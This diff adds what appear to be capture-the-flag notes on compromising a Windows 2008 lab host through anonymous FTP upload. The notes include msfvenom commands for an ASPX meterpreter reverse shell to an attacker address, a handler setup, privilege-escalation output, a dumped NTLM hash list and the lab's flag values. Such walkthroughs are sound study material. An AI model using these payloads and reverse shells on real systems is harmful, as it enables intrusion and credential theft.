@@ -1,0 +1,81 @@
+Hosts
+=====
+
+address     mac  name  os_name       os_flavor  os_sp  purpose  info  comments
+-------     ---  ----  -------       ---------  -----  -------  ----  --------
+10.10.10.5             Windows 2008                    server         
+
+Services
+========
+
+host        port  proto  name  state  info
+----        ----  -----  ----  -----  ----
+10.10.10.5  21    tcp    ftp   open   Microsoft ftpd
+10.10.10.5  80    tcp    http  open   Microsoft IIS httpd 7.5
+
+
+auxiliary/scanner/ftp/anonymous
+[+] 10.10.10.5:21         - 10.10.10.5:21 - Anonymous READ/WRITE (220 Microsoft FTP Service)
+
+auxiliary/scanner/ftp/ftp_version
+[+] 10.10.10.5:21         - FTP Banner: '220 Microsoft FTP Service\x0d\x0a'
+
+
+msfvemon  -f aspx -p windows/meterpreter/reverse_tcp LHOST=(you here) LPORT=(port here) -e x86/shikata_ga_nai -o path/to/file.aspx
+
+/usr/bin/msfvenom -f aspx -p windows/meterpreter/reverse_tcp LHOST=10.10.14.105 LPORT=44441 -o /alpha44.aspx
+
+use exploit/multi/handler
+set PAYLOAD <Payload name>
+set LHOST <LHOST value>
+set LPORT <LPORT value>
+set ExitOnSession false
+exploit -j -z
+
+
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.10.5 - Collecting local exploits for x86/windows...
+[*] 10.10.10.5 - 38 exploit checks are being tried...
+[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+
+msf exploit(ms14_058_track_popup_menu) > run
+
+[*] Started reverse TCP handler on 10.10.14.105:4444 
+[*] Launching notepad to host the exploit...
+[+] Process 1824 launched.
+[*] Reflectively injecting the exploit DLL into 1824...
+[*] Injecting exploit into 1824...
+[*] Exploit injected. Injecting payload into 1824...
+[*] Payload injected. Executing exploit...
+[*] Sending stage (956991 bytes) to 10.10.10.5
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Meterpreter session 8 opened (10.10.14.105:4444 -> 10.10.10.5:49166) at 2017-08-23 15:41:33 -0400
+
+Meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a450f6000be7df50ee304d0a838d638f:::
+babis:1000:aad3b435b51404eeaad3b435b51404ee:a1133ec0f7779e215acc8a36922acf57:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+
+root: e621a0b5041708797c4fc4728bc72b4b
+user: 9ecdd6a3aedf24b41562fea70f4cb3e8
+
+https://community.rapid7.com/community/metasploit/blog/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more
+
+https://netsec.ws/?p=331
+
+
+
